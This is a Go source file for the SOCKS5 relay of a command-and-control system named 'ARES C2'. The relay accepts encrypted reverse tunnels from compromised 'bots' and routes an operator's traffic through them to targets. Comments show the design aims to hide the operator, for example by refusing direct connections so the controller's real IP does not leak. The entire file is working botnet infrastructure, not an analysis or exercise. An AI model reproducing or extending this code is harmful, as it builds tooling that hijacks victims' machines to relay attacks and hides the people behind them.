/*
 * ARES C2 — SOCKS5 Relay Server (v2 — Multiplexed Framing)
 *
 * Protocol between C2 and bot tunnel:
 *   Frame: [4-byte session_id][4-byte length][payload]
 *   Control frames: session_id=0
 *     CONNECT: "CONNECT|session_id|host:port\n"
 *     OK:      "OK|session_id\n"
 *     CLOSE:   "CLOSE|session_id\n"
 *     ERR:     "ERR|session_id|reason\n"
 *
 * Architecture:
 *   Operator → SOCKS5(:1080) → C2 Relay → Framed Tunnel → Bot → Target
 */

package relay

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"encoding/binary"
	"fmt"
	"io"
	"log"
	"net"
	"strings"
	"sync"
	"sync/atomic"
	"time"
)

// Socks5Relay manages reverse SOCKS5 tunnels from bots
type Socks5Relay struct {
	tunnels    map[string]*BotTunnel // botID -> tunnel
	mu         sync.RWMutex
	listenPort int
	listener   net.Listener
	running    atomic.Bool

	BytesIn     atomic.Int64
	BytesOut    atomic.Int64
	Connections atomic.Int64
}

// BotTunnel wraps a net.Conn with session multiplexing
type BotTunnel struct {
	BotID     string
	Conn      net.Conn
	Sessions  map[uint32]*TunnelSession
	mu        sync.RWMutex
	nextID    uint32
	aead      cipher.AEAD  // v5.0: AES-256-GCM authenticated encryption
	nonceCtr  uint64       // v5.0: incrementing nonce counter
	nonceMu   sync.Mutex   // v5.0: nonce counter mutex
}

// TunnelSession is one SOCKS5 connection routed through a bot
type TunnelSession struct {
	ID     uint32
	Target string
	Data   chan []byte
	Done   chan struct{}
}

func NewSocks5Relay(listenPort int) *Socks5Relay {
	return &Socks5Relay{
		tunnels:    make(map[string]*BotTunnel),
		listenPort: listenPort,
	}
}

// RegisterTunnel — called when a bot establishes reverse tunnel
func (r *Socks5Relay) RegisterTunnel(botID string, conn net.Conn) {
	r.mu.Lock()
	defer r.mu.Unlock()

	if old, ok := r.tunnels[botID]; ok {
		old.Close()
	}

	tunnel := &BotTunnel{
		BotID:    botID,
		Conn:     conn,
		Sessions: make(map[uint32]*TunnelSession),
		nextID:   1,
	}
	r.tunnels[botID] = tunnel
	log.Printf("[SOCKS5] Tunnel registered: bot=%s remote=%s", botID, conn.RemoteAddr())

	// Start reading frames from bot
	go tunnel.readLoop()
}

func (t *BotTunnel) Close() {
	t.mu.Lock()
	for _, s := range t.Sessions {
		close(s.Done)
	}
	t.Sessions = nil
	t.mu.Unlock()
	t.Conn.Close()
}

// writeBinaryFrame sends an AES-GCM encrypted frame to the bot tunnel
// Wire format: [4-byte total_len][12-byte nonce][ciphertext][16-byte GCM tag]
func (t *BotTunnel) writeBinaryFrame(frameType byte, sessionID uint32, payload []byte) error {
	if t.aead == nil {
		return fmt.Errorf("tunnel crypto not initialized")
	}

	// Build plaintext: [type:1][session_id:4][payload_len:4][payload]
	plaintext := make([]byte, 9+len(payload))
	plaintext[0] = frameType
	binary.BigEndian.PutUint32(plaintext[1:5], sessionID)
	binary.BigEndian.PutUint32(plaintext[5:9], uint32(len(payload)))
	copy(plaintext[9:], payload)

	// Build counter-based nonce (12 bytes)
	nonce := make([]byte, 12)
	t.nonceMu.Lock()
	t.nonceCtr++
	binary.LittleEndian.PutUint64(nonce[4:], t.nonceCtr)
	t.nonceMu.Unlock()
	// First 4 bytes: random (set during init)
	rand.Read(nonce[:4])

	// Encrypt: nonce + ciphertext + tag
	ciphertext := t.aead.Seal(nil, nonce, plaintext, nil)

	// Wire: [4-byte len][12-byte nonce][ciphertext+tag]
	wirePayload := append(nonce, ciphertext...)
	lenBuf := make([]byte, 4)
	binary.BigEndian.PutUint32(lenBuf, uint32(len(wirePayload)))

	// Write atomically
	wire := append(lenBuf, wirePayload...)
	_, err := t.Conn.Write(wire)
	return err
}

// readLoop reads framed responses from the bot and dispatches to sessions
// Binary-safe: accumulates into line buffer, DATA payload extracted by pipe position
func (t *BotTunnel) readLoop() {
	defer t.Close()
	buf := make([]byte, 65536)
	lineBuf := make([]byte, 0, 65536)

	for {
		n, err := t.Conn.Read(buf)
		if err != nil || n == 0 {
			return
		}

		lineBuf = append(lineBuf, buf[:n]...)

		// Process complete lines (delimited by \n)
		for {
			nlIdx := -1
			// For DATA frames, the \n delimiter is at the END of the frame
			// DATA|id|<payload>\n — payload may contain \n
			// So we check: if line starts with DATA|, find the LAST \n
			// For control frames (OK|, ERR|, CLOSE|), first \n works fine
			
			if len(lineBuf) >= 5 && string(lineBuf[:5]) == "DATA|" {
				// DATA frame: find second pipe, then take everything until trailing \n
				// Format: DATA|<id>|<binary payload>\n
				// Binary payload may contain \n, so we can't split by \n
				// Instead, we accept the entire remaining buffer as one DATA frame
				// if it ends with \n
				if lineBuf[len(lineBuf)-1] == '\n' {
					nlIdx = len(lineBuf) - 1
				} else {
					break // Need more data
				}
			} else {
				// Control frame — find first \n
				for i := 0; i < len(lineBuf); i++ {
					if lineBuf[i] == '\n' {
						nlIdx = i
						break
					}
				}
			}
			
			if nlIdx < 0 {
				break
			}

			line := string(lineBuf[:nlIdx])
			lineBuf = lineBuf[nlIdx+1:]

			parts := strings.SplitN(line, "|", 3)
			if len(parts) < 2 {
				continue
			}

			cmd := parts[0]
			var sessionID uint32
			fmt.Sscanf(parts[1], "%d", &sessionID)

			t.mu.RLock()
			sess, ok := t.Sessions[sessionID]
			t.mu.RUnlock()

			switch cmd {
			case "OK":
				if ok {
					select {
					case sess.Data <- []byte("OK"):
					default:
					}
				}
			case "ERR":
				if ok {
					select {
					case sess.Data <- []byte("ERR"):
					default:
					}
				}
			case "DATA":
				if ok && len(parts) > 2 {
					// parts[2] is binary payload (may contain pipes, that's fine)
					select {
					case sess.Data <- []byte(parts[2]):
					default:
					}
				}
			case "CLOSE":
				if ok {
					close(sess.Done)
					t.mu.Lock()
					delete(t.Sessions, sessionID)
					t.mu.Unlock()
				}
			}
		}
	}
}

func (t *BotTunnel) NewSession(target string) *TunnelSession {
	t.mu.Lock()
	defer t.mu.Unlock()
	id := t.nextID
	t.nextID++
	s := &TunnelSession{
		ID:     id,
		Target: target,
		Data:   make(chan []byte, 64),
		Done:   make(chan struct{}),
	}
	t.Sessions[id] = s
	return s
}

func (r *Socks5Relay) RemoveTunnel(botID string) {
	r.mu.Lock()
	defer r.mu.Unlock()
	if t, ok := r.tunnels[botID]; ok {
		t.Close()
		delete(r.tunnels, botID)
	}
}

func (r *Socks5Relay) GetActiveTunnels() []string {
	r.mu.RLock()
	defer r.mu.RUnlock()
	ids := make([]string, 0, len(r.tunnels))
	for id := range r.tunnels {
		ids = append(ids, id)
	}
	return ids
}

func (r *Socks5Relay) Start(targetBotID string) error {
	var err error
	r.listener, err = net.Listen("tcp", fmt.Sprintf("127.0.0.1:%d", r.listenPort))
	if err != nil {
		return fmt.Errorf("SOCKS5 listen failed: %w", err)
	}

	r.running.Store(true)
	log.Printf("[SOCKS5] Relay listening on 127.0.0.1:%d -> bot %s", r.listenPort, targetBotID)

	go func() {
		for r.running.Load() {
			conn, err := r.listener.Accept()
			if err != nil {
				if r.running.Load() {
					log.Printf("[SOCKS5] Accept error: %v", err)
				}
				continue
			}
			r.Connections.Add(1)
			go r.handleSocks5Client(conn, targetBotID)
		}
	}()

	return nil
}

func (r *Socks5Relay) Stop() {
	r.running.Store(false)
	if r.listener != nil {
		r.listener.Close()
	}
}

// handleSocks5Client — RFC 1928 SOCKS5
func (r *Socks5Relay) handleSocks5Client(client net.Conn, botID string) {
	defer client.Close()
	client.SetDeadline(time.Now().Add(5 * time.Minute))

	// Phase 1: Greeting
	buf := make([]byte, 258)
	n, err := client.Read(buf)
	if err != nil || n < 3 || buf[0] != 0x05 {
		return
	}
	client.Write([]byte{0x05, 0x00}) // No auth

	// Phase 2: CONNECT request
	n, err = client.Read(buf)
	if err != nil || n < 7 || buf[0] != 0x05 || buf[1] != 0x01 {
		client.Write([]byte{0x05, 0x07, 0x00, 0x01, 0, 0, 0, 0, 0, 0})
		return
	}

	var targetHost string
	var targetPort uint16

	switch buf[3] {
	case 0x01: // IPv4
		if n < 10 { return }
		targetHost = fmt.Sprintf("%d.%d.%d.%d", buf[4], buf[5], buf[6], buf[7])
		targetPort = binary.BigEndian.Uint16(buf[8:10])
	case 0x03: // Domain
		dl := int(buf[4])
		if n < 5+dl+2 { return }
		targetHost = string(buf[5 : 5+dl])
		targetPort = binary.BigEndian.Uint16(buf[5+dl : 7+dl])
	case 0x04: // IPv6
		if n < 22 { return }
		targetHost = net.IP(buf[4:20]).String()
		targetPort = binary.BigEndian.Uint16(buf[20:22])
	default:
		client.Write([]byte{0x05, 0x08, 0x00, 0x01, 0, 0, 0, 0, 0, 0})
		return
	}

	target := fmt.Sprintf("%s:%d", targetHost, targetPort)
	log.Printf("[SOCKS5] CONNECT -> %s via bot %s", target, botID)

	// Phase 3: Route through bot tunnel
	r.mu.RLock()
	tunnel, ok := r.tunnels[botID]
	r.mu.RUnlock()

	if !ok || tunnel == nil {
		// SECURITY: Never connect directly from C2 — leaks real IP
		log.Printf("[SOCKS5] No tunnel for bot %s — refusing direct connection (IP leak protection)", botID)
		client.Write([]byte{0x05, 0x04, 0x00, 0x01, 0, 0, 0, 0, 0, 0})
		return
	}

	// Create a session for this SOCKS5 connection
	sess := tunnel.NewSession(target)

	// Send CONNECT to bot via binary frame
	connectPayload := []byte(target)
	err = tunnel.writeBinaryFrame(0x10, sess.ID, connectPayload)
	if err != nil {
		client.Write([]byte{0x05, 0x04, 0x00, 0x01, 0, 0, 0, 0, 0, 0})
		return
	}

	// Wait for OK/ERR
	select {
	case resp := <-sess.Data:
		if string(resp) != "OK" {
			client.Write([]byte{0x05, 0x04, 0x00, 0x01, 0, 0, 0, 0, 0, 0})
			return
		}
	case <-time.After(15 * time.Second):
		client.Write([]byte{0x05, 0x04, 0x00, 0x01, 0, 0, 0, 0, 0, 0})
		return
	}

	// Success
	client.Write([]byte{0x05, 0x00, 0x00, 0x01, 0, 0, 0, 0, 0, 0})

	// Relay: client <-> tunnel session
	done := make(chan struct{}, 2)

	// Client -> Bot
	go func() {
		defer func() { done <- struct{}{} }()
		buf := make([]byte, 32*1024)
		for {
			n, err := client.Read(buf)
			if n > 0 {
				r.BytesOut.Add(int64(n))
				tunnel.writeBinaryFrame(0x20, sess.ID, buf[:n])
			}
			if err != nil { return }
		}
	}()

	// Bot -> Client
	go func() {
		defer func() { done <- struct{}{} }()
		for {
			select {
			case data := <-sess.Data:
				r.BytesIn.Add(int64(len(data)))
				client.Write(data)
			case <-sess.Done:
				return
			}
		}
	}()

	<-done

	// Cleanup — send CLOSE frame
	tunnel.writeBinaryFrame(0x30, sess.ID, nil)
}

func (r *Socks5Relay) bidirectionalCopy(a, b net.Conn) {
	done := make(chan struct{}, 2)
	copy := func(dst, src net.Conn, counter *atomic.Int64) {
		defer func() { done <- struct{}{} }()
		buf := make([]byte, 32*1024)
		for {
			n, err := src.Read(buf)
			if n > 0 {
				counter.Add(int64(n))
				if _, werr := dst.Write(buf[:n]); werr != nil { return }
			}
			if err != nil { return }
		}
	}
	go copy(b, a, &r.BytesOut)
	go copy(a, b, &r.BytesIn)
	<-done
}

// ── Tunnel Listener — Accepts reverse tunnels from bots ──

type TunnelListener struct {
	relay    *Socks5Relay
	listener net.Listener
	running  atomic.Bool
}

func NewTunnelListener(relay *Socks5Relay) *TunnelListener {
	return &TunnelListener{relay: relay}
}

func (t *TunnelListener) Start(port int) error {
	var err error
	t.listener, err = net.Listen("tcp", fmt.Sprintf("127.0.0.1:%d", port))
	if err != nil {
		return err
	}

	t.running.Store(true)
	log.Printf("[TUNNEL] Listening for bot tunnels on 127.0.0.1:%d", port)

	go func() {
		for t.running.Load() {
			conn, err := t.listener.Accept()
			if err != nil { continue }
			go t.handleNewTunnel(conn)
		}
	}()

	return nil
}

func (t *TunnelListener) Stop() {
	t.running.Store(false)
	if t.listener != nil {
		t.listener.Close()
	}
}

func (t *TunnelListener) handleNewTunnel(conn net.Conn) {
	// v5.0: AES-GCM handshake — agent sends:
	// [magic:4 "AE5\x00"][session_key:32][bot_id_len:1][bot_id][hostname]
	buf := make([]byte, 512)
	conn.SetReadDeadline(time.Now().Add(10 * time.Second))
	n, err := conn.Read(buf)
	conn.SetReadDeadline(time.Time{})
	if err != nil || n < 37 {
		conn.Close()
		return
	}

	var botID, hostname string
	var sessionKey []byte

	// Check for AES-GCM handshake magic: "AE5\x00"
	if n >= 37 && buf[0] == 'A' && buf[1] == 'E' && buf[2] == '5' && buf[3] == 0x00 {
		// Extract 32-byte session key
		sessionKey = make([]byte, 32)
		copy(sessionKey, buf[4:36])

		// Extract bot ID
		bidLen := int(buf[36])
		if bidLen <= 0 || 37+bidLen > n {
			conn.Close()
			return
		}
		botID = string(buf[37 : 37+bidLen])

		// Extract hostname (remaining bytes)
		if 37+bidLen < n {
			hostname = string(buf[37+bidLen : n])
		}
	} else {
		// Legacy plaintext fallback: "RELAY|bot_id|hostname\n"
		line := strings.TrimRight(string(buf[:n]), "\r\n ")
		parts := strings.Split(line, "|")
		if len(parts) >= 2 && parts[0] == "RELAY" {
			botID = parts[1]
			if len(parts) > 2 {
				hostname = parts[2]
			}
		}
		if botID == "" {
			conn.Close()
			return
		}
		// Legacy: no encryption, send text ACK
		log.Printf("[TUNNEL] ⚠ WARNING: Legacy plaintext tunnel from %s (bot %s)", conn.RemoteAddr(), botID)
		conn.Write([]byte("ACK\n"))
		tunnel := &BotTunnel{
			BotID:    botID,
			Conn:     conn,
			Sessions: make(map[uint32]*TunnelSession),
			nextID:   1,
		}
		t.relay.mu.Lock()
		if old, ok := t.relay.tunnels[botID]; ok {
			old.Close()
		}
		t.relay.tunnels[botID] = tunnel
		t.relay.mu.Unlock()
		go tunnel.readLoop()
		return
	}

	// v5.0 FIX H-15: Validate botID format (hex-only, 8-64 chars)
	for _, c := range botID {
		if !((c >= '0' && c <= '9') || (c >= 'a' && c <= 'f') || (c >= 'A' && c <= 'F')) {
			log.Printf("[TUNNEL] Rejected: invalid botID format from %s", conn.RemoteAddr())
			conn.Close()
			return
		}
	}
	if len(botID) < 8 || len(botID) > 64 {
		log.Printf("[TUNNEL] Rejected: botID length invalid from %s", conn.RemoteAddr())
		conn.Close()
		return
	}

	// Initialize AES-256-GCM cipher
	block, err := aes.NewCipher(sessionKey)
	if err != nil {
		log.Printf("[TUNNEL] AES init failed for bot %s: %v", botID, err)
		conn.Close()
		return
	}
	aead, err := cipher.NewGCM(block)
	if err != nil {
		log.Printf("[TUNNEL] GCM init failed for bot %s: %v", botID, err)
		conn.Close()
		return
	}

	// Wipe session key from memory
	for i := range sessionKey {
		sessionKey[i] = 0
	}

	log.Printf("[TUNNEL] AES-GCM tunnel established: id=%s host=%s remote=%s",
		botID, hostname, conn.RemoteAddr())

	// Send ACK: [magic:4 "AE5K"]
	conn.Write([]byte{'A', 'E', '5', 'K'})

	// Create tunnel with AEAD cipher
	tunnel := &BotTunnel{
		BotID:    botID,
		Conn:     conn,
		Sessions: make(map[uint32]*TunnelSession),
		nextID:   1,
		aead:     aead,
	}

	t.relay.mu.Lock()
	if old, ok := t.relay.tunnels[botID]; ok {
		old.Close()
	}
	t.relay.tunnels[botID] = tunnel
	t.relay.mu.Unlock()

	// Start AES-GCM read loop
	go t.aesReadLoop(tunnel)
}

// aesReadLoop reads AES-GCM encrypted frames from bot tunnel
// Wire format per frame: [4-byte total_len][12-byte nonce][ciphertext][16-byte GCM tag]
// Decrypted plaintext: [type:1][session_id:4][payload_len:4][payload]
func (t *TunnelListener) aesReadLoop(tunnel *BotTunnel) {
	defer tunnel.Close()

	for {
		// Step 1: Read 4-byte length prefix
		lenBuf := make([]byte, 4)
		if _, err := io.ReadFull(tunnel.Conn, lenBuf); err != nil {
			return
		}
		encTotal := int(binary.BigEndian.Uint32(lenBuf))
		if encTotal < 12+16+9 || encTotal > 1024*1024+128 {
			return // corrupt or too large
		}

		// Step 2: Read encrypted blob (nonce + ciphertext + tag)
		encBuf := make([]byte, encTotal)
		if _, err := io.ReadFull(tunnel.Conn, encBuf); err != nil {
			return
		}

		// Step 3: AES-GCM decrypt
		if tunnel.aead == nil {
			return
		}
		nonceSize := tunnel.aead.NonceSize() // 12
		if encTotal < nonceSize+tunnel.aead.Overhead() {
			return
		}
		nonce := encBuf[:nonceSize]
		ciphertext := encBuf[nonceSize:]

		plaintext, err := tunnel.aead.Open(nil, nonce, ciphertext, nil)
		if err != nil {
			log.Printf("[TUNNEL] AES-GCM decrypt failed for bot %s: %v", tunnel.BotID, err)
			return // auth failure = tampered frame, kill tunnel
		}

		if len(plaintext) < 9 {
			return // too short
		}

		// Step 4: Parse decrypted frame
		realType := plaintext[0]
		sessionID := binary.BigEndian.Uint32(plaintext[1:5])
		payloadLen := int(binary.BigEndian.Uint32(plaintext[5:9]))

		if payloadLen < 0 || 9+payloadLen > len(plaintext) {
			return
		}

		payload := plaintext[9 : 9+payloadLen]

		// Dispatch by frame type
		tunnel.mu.RLock()
		sess, ok := tunnel.Sessions[sessionID]
		tunnel.mu.RUnlock()

		switch realType {
		case 0x11: // CONNECT_OK
			if ok {
				select {
				case sess.Data <- []byte("OK"):
				default:
				}
			}
		case 0x12: // CONNECT_ERR
			if ok {
				select {
				case sess.Data <- []byte("ERR"):
				default:
				}
			}
		case 0x20: // DATA
			if ok {
				// Make a copy since plaintext buffer will be reused
				dataCopy := make([]byte, len(payload))
				copy(dataCopy, payload)
				select {
				case sess.Data <- dataCopy:
				default:
				}
			}
		case 0x30: // CLOSE
			if ok {
				close(sess.Done)
				tunnel.mu.Lock()
				delete(tunnel.Sessions, sessionID)
				tunnel.mu.Unlock()
			}
		}
	}
}

